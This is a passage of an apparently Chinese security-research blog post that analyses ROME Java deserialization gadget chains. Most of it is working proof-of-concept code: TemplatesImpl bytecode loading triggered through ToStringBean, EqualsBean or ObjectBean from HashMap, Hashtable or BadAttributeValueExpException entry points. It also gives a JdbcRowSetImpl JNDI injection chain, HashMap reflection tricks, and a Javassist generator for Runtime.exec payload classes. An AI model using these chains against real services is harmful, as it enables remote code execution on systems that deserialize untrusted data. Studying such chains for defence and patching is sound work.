<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"><span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>gadget</strong></p>
<hr>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* EqualsBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>

<h2 id="HashMap-ObjectBean-ToStringBean-TemplatesImpl"><a href="#HashMap-ObjectBean-ToStringBean-TemplatesImpl" class="headerlink" title="HashMap+ObjectBean+ToStringBean+TemplatesImpl"></a>HashMap+ObjectBean+ToStringBean+TemplatesImpl</h2><p>Poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"><span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(objectBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>chain</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashcode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="（二）HashMap和HashTable"><a href="#（二）HashMap和HashTable" class="headerlink" title="（二）HashMap和HashTable"></a>（二）HashMap和HashTable</h1><p>上面入口类用了HashMap去触发key的hashCode方法。</p>
<p>HashMap可以用HashTable替换。</p>
<p>HashTable的readObject会调用reconstitutionPut，reconstitutionPut里面调用了key.hashCode()。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258462928-7babc412-e6e1-49fc-baad-f090cbb3bfa6.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258525835-9e3774ee-81c6-4728-ba81-fc3f2e1cec1e.png"></p>
<p>Poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="（三）BadAttributeValueExpException"><a href="#（三）BadAttributeValueExpException" class="headerlink" title="（三）BadAttributeValueExpException"></a>（三）BadAttributeValueExpException</h1><p><font style="color:rgb(50, 50, 93);">CC5的入口类也是BadAttributeValueExpException，具体可以看CC5。</font></p>
<p><font style="color:rgb(50, 50, 93);"></font></p>
<p><font style="color:rgb(50, 50, 93);">BadAttributeValueExpException，它的readObject方法会调用其Object类型的val成员的toString方法。要求安全管理器为空。</font></p>
<p><font style="color:rgb(50, 50, 93);"></font></p>
<p><font style="color:rgb(50, 50, 93);">可以直接用BadAttributeValueExpException的readObject去触发ToStringBean的toString方法。</font></p>
<p><font style="color:rgb(50, 50, 93);">不再使用ObjectBean或者EqualsBean</font></p>
<p><font style="color:rgb(50, 50, 93);"></font></p>
<p><font style="color:rgb(50, 50, 93);">Poc</font></p>
<p><font style="color:rgb(50, 50, 93);"></font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"> <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line"> setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"> setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"> setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"> <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"> <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line"> </span><br><span class="line"> setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"> </span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>Gadget</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* BadAttributeValueExpException.readObject()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="（四）JdbcRowSetImpl"><a href="#（四）JdbcRowSetImpl" class="headerlink" title="（四）JdbcRowSetImpl"></a>（四）JdbcRowSetImpl</h1><p>JdbcRowSetImpl利用链是针对后半段TemplatesImpl.getOutputProperties()任意类加载进行替换的。</p>
<p>JdbcRowSetImpl利用链的结果是能造成JNDI注入，于是下面就可以配合RMI或者LDAP服务进行攻击了。</p>
<p>由于JDNI注入中trustURLCodebase的限制，这里限制的攻击版本为</p>
<ul>
<li>RMI：JDK 6u132、JDK 7u122、JDK 8u113之前</li>
<li>LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前</li>
</ul>
<p>在Fastjson反序列化漏洞中能造成JNDI注入的同样是JdbcRowSetImpl这条链。问题出在JdbcRowSetImpl.getDatabaseMetaData()这个getter上</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732259347065-54ba77d4-27c4-4883-964e-fff5446f821f.png"></p>
<p>connect函数会调用lookup()，触发了JNDI接口调用。</p>
<p>lookup()内的值由dataSource属性控制。</p>
<p>Poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">#EXP为我们的恶意类</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="（五）HashMap利用链优化"><a href="#（五）HashMap利用链优化" class="headerlink" title="（五）HashMap利用链优化"></a>（五）HashMap利用链优化</h1><p>hashMap在put时也会调用一次key的hashCode，为了避免在生成poc时本地执行命令，可以选择反射修改HashMap的key值。</p>
<p>不过值得注意的是，根据HashMap的实现原理，key-value实际上是存储于它的内部类Node&lt;K,V&gt;中的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HashMap大小设置为1</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//先存入无关数据</span></span><br><span class="line">hashMap.put(<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射获取属性值table</span></span><br><span class="line">Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line"><span class="comment">//获取第一个Node</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//反射修改Node中的key值</span></span><br><span class="line">setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br></pre></td></tr></table></figure>



<p>也可以使用marshalsec工具中的JDKUtil#makeMap来手动生成一个HashMap。这里v1和v2分别为key和value。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="（六）Payload缩短"><a href="#（六）Payload缩短" class="headerlink" title="（六）Payload缩短"></a>（六）Payload缩短</h1><p>AbstractTranslet由于我们的恶意类也就是TemplatesImpl加载的子类需要继承AbstractTranslet类，并重写两个transform()方法。否则编译无法通过，无法生成.class文件。</p>
<p>但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。</p>
<p>Gedgat的调用流程中，仍有一些细节可以优化，比如</p>
<ul>
<li>TemplatesImpl._name的长度可以为1</li>
<li>TemplatesImpl._tfactory可以不用赋值</li>
<li>HashMap的value长度可以为1</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shell;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellByteCodes</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteShell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] shell = GetShellByteCodes.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;S&quot;</span>));</span><br><span class="line">        fileOutputStream.write(shell);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        WriteShell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shorter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> Serial.Serial;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Equal_Shorter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;A.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        setValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"> </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Serial.Serialize(hashMap);</span><br><span class="line">        Serial.DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhs0008fscxhgsi0xis" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a></li></ul></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
